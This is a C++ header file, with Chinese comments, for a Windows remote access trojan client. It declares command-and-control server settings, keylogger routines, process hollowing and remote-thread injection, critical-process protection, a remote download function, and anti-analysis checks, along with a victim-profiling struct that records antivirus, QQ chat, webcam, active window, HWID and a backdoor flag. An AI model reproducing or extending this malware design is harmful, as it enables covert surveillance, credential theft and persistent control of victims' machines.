#pragma once
#include "LoginManager.h"
#include <TLHELP32.H>
#include <comdef.h>
#include <string>
#include <wininet.h>
#include<Shlwapi.h>
#pragma comment(lib, "shlwapi.lib")
#include <LM.h>
#pragma comment(lib, "netapi32.lib")
#include "md5.h"
/*************判断视频的头文件*******************/
#include <strmif.h>
#include <uuids.h>
#pragma comment(lib, "strmiids.lib")

#include <DXGI.h>
#pragma comment(lib,"DXGI.lib")

#include <Psapi.h>
#pragma comment (lib,"Psapi.lib")

#include "Input.h" //键盘记录



using namespace std;


struct Function    
{
	BOOL IsKeyboard;		//键盘离线记录
	BOOL bool0;
	BOOL ProtectedProcess;	//进程保护
	BOOL antinet;			//反查流量
	BOOL RunDllEntryProc;	//是否运行DLL入口
	
	BOOL  Processdaemon;	//进程守护
	BOOL  puppet;			//傀儡进程
	BOOL  special;			//特别
	BOOL  bool4;	//备用
	BOOL  bool5;	//备用


	TCHAR other1[255];  //备用
	TCHAR other2[255];  //备用
	TCHAR other3[255];  //备用
	TCHAR other4[255];	//备用
	TCHAR other5[255];  //备用
};

extern struct Info
{
	char mark[30];		//标记
	TCHAR szAddress[255];  //ip
	TCHAR szPort[30];		//端口
	BOOL IsTcp;			//通信模式
	TCHAR szAddress2[255];  //ip
	TCHAR szPort2[30];		//端口
	BOOL IsTcp2;			//通信模式
	TCHAR szAddress3[255];  //ip
	TCHAR szPort3[30];		//端口
	BOOL IsTcp3;			//通信模式
	TCHAR szRunSleep[30];	//运行等待（开始运行时等待时间 防止手动查看流量监控）
	TCHAR szHeart[30];		//重连时间
	TCHAR szGroup[50];		//分组
	TCHAR szVersion[50];	//版本
	TCHAR Remark[50];		//备注
	Function otherset;		//其他设置
}MyInfo;


struct plugInfo
{
	char mark[30];		//标记
	TCHAR szAddress[255];  //ip
	DWORD szPort;	//端口
	BOOL IsTcp;
	BOOL RunDllEntryProc;
};


typedef struct
{
	BYTE			Btoken;			//协议
	TCHAR			N_ip[255];		//内外IP
	TCHAR			ip[20];			//公网IP
	TCHAR			addr[40];		//位置
	TCHAR			UserActive[15];	//活跃状态
	TCHAR			CptName[50];	//计算机名
	TCHAR			OsName[50];		//系统名
	TCHAR			OSVersion[30];	//系统
	TCHAR			CPU[60];		//CPU
	TCHAR			DAM[200];		//硬盘+内存
	TCHAR			GPU[150];		//显卡
	TCHAR			Window[255];	//当前窗口
	TCHAR			Group[50];		//分组
	TCHAR			Version[50];	//版本
	TCHAR			Remark[50];		//备注
	TCHAR			m_Time[50];		//运行时间
	TCHAR			ExeAndOs[10];	//程序和系统是否为64位
	TCHAR			Process[50];	//进程权限用户
	TCHAR			ProcPath[250];	//进程路径
	TCHAR			pid[10];		//进程ID
	TCHAR			IsWebCam[4];	//摄像头
	TCHAR			Chat[255];		//聊天
	TCHAR			Virus[50];		//杀毒
	TCHAR			lpLCData[32];	//系统语言
	TCHAR			Monitors[255];	//显示器信息
	TCHAR			szSysdire[50];	//系统目录
	TCHAR			szHWID[49];		//HWID
	BOOL			backdoor;		//后门标志
}LOGININFO;

//远程线程参数结构体
typedef struct _remoteTdParams
{
	LPVOID ZWinExec;             // WinExec Function Address
	LPVOID ZOpenProcess;         // OpenProcess Function Address
	LPVOID ZExitProcess;
	LPVOID ZWaitForSingleObject; // WaitForSingleObject Function Address
	DWORD ZPid;                  // Param => Process id
	HANDLE ZProcessHandle;       // Param => Handle
	CHAR filePath[255];   // Param => File Path
}RemoteParam;


int sendLoginInfo(ISocketBase* pClient, TCHAR* Time, BOOL sw_user);

VOID BufToMd5(TCHAR* a, TCHAR* b, TCHAR* c = NULL, TCHAR* d = NULL, TCHAR* e = NULL, TCHAR* f = NULL, TCHAR* g = NULL, TCHAR* h=NULL);

void getactivewindows(TCHAR* str); //获取前景窗口



BOOL AntiCheck();

unsigned int __stdcall AntiCheckThread(LPVOID lparam);
/////////////////杀毒显示//////////////////////////////////
typedef struct
{
	TCHAR* Course;
	TCHAR* Name;
}AYSDFE;

typedef BOOL(WINAPI* TRegQueryValueEx)(HKEY, LPCTSTR, LPDWORD, LPDWORD, LPBYTE, LPDWORD);
typedef int (WINAPI* TRegOpenKeyEx)(HKEY, LPCTSTR, DWORD, REGSAM, PHKEY);
typedef LONG(WINAPI* TRegSetValueEx)(HKEY hKey, LPCTSTR lpValueName, DWORD Reserved, DWORD dwType, CONST BYTE* lpData, DWORD cbData);
typedef BOOL(WINAPI* TRegEnumValue)(HKEY, DWORD, LPTSTR, LPDWORD, LPDWORD, LPDWORD, LPBYTE, LPDWORD);
typedef BOOL(WINAPI* TRegEnumKeyEx)(HKEY, DWORD, LPTSTR, LPDWORD, LPDWORD, LPTSTR, LPDWORD, PFILETIME);
typedef BOOL(WINAPI* TRegCloseKey)(HKEY);

typedef BOOL(WINAPI* TSHGetSpecialFolderPath)(HWND hwndOwner, LPTSTR lpszPath, int nFolder, BOOL fCreate);

BOOL GetOpenKeyLoggerReg();

unsigned int __stdcall KeyLogger(LPVOID lparam);

void GetTimeFormat(TCHAR* t_time);

DWORD GetProcessID(LPCWSTR lpProcessName);

TCHAR* GetVirus();

void GetActive(TCHAR* UserActive); // 用户状态

BOOL GetQQ(TCHAR* m_qq);

UINT EnumDevices(); //枚举视频设备

bool IsWebCam();

BOOL GetProcessUserName(TCHAR* strProcessUser);

BOOL GetLogonFromToken(HANDLE hToken, _bstr_t& strUser, _bstr_t& strdomain);

HRESULT GetUserFromProcess(TCHAR* temp);

BOOL GetProcessIntegrity(LOGININFO* temp);//等级

void GetDiskAndMem(TCHAR* pBuf); // 内存

int  ReadRegEx(HKEY MainKey, LPCTSTR SubKey, LPCTSTR Vname, DWORD Type, TCHAR* szData, LPBYTE szBytes, DWORD lbSize, int Mode); //读取注册表的指定键的数据

void getgpuandMonitor(TCHAR* p_buf, TCHAR* p_Monitorbuf); //获取GPU信息 显示器

BOOL IsWindowsX64(); //判断操作系统是否为64位

void GetNtVersionNumbers(TCHAR* OSVersion, TCHAR* CptName);//获取系统版本号

LONG WINAPI My_bad_exception(struct _EXCEPTION_POINTERS* ExceptionInfo);

char* TCHAR2char(const TCHAR* STR);

TCHAR* char2TCAHR(const char* str);

BOOL CallNtSetinformationProcess();

unsigned int __stdcall loactThreadProc(_In_ LPVOID lpParameter);

BOOL EnablePrivilege(LPCTSTR lpPrivilegeName, BOOL bEnable);

int memfind(const char* mem, const char* str, int sizem, int sizes);

bool http_get(LPCTSTR szURL, LPCTSTR szFileName);

bool buildremoteprocess(byte* data, int size);

void Getfindinfo(TCHAR* s, const TCHAR* f1, TCHAR* outstring, BOOL* user);

BOOL DosPathToNtPath(LPTSTR pszDosPath, LPTSTR pszNtPath);

BOOL GetProcessFullPath(DWORD dwPID, TCHAR* fullPath);
